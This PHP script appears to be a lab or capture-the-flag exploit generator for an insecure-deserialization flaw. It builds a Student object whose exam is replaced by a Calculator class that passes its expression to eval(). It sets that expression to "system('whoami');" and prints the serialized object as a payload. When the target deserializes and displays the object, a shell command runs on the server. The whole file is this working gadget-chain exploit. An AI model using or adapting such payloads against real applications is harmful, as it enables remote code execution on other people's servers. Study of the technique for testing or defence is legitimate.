<?php
include_once("exam.php");
class Student
{

    public $name;
    public $age;
    public $exam;
    public function __construct($name, $age)
    {
        $this->name = $name;
        $this->age = $age;
    }

    public function __toString()
    {
        return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>";
    }

    public function join($exam)
    {
        $this->exam = $exam;
    }

    public function test()
    {
        $this->exam->test();
    }

    public function get_point()
    {
        if (isset($this->exam))
            return $this->exam->get_result();
        return "N/A";
    }
}

class Calculator
{
    public $expression;
    public function __construct($expr)
    {
        $this->expression = $expr;
    }

    public function get_result()
    {
        $result = eval($this->expression);
        return $result;
    }
}

$student = new Student("truong", "18");
$payload = new Calculator("system('whoami');");
$student->join($payload);
echo serialize($student);


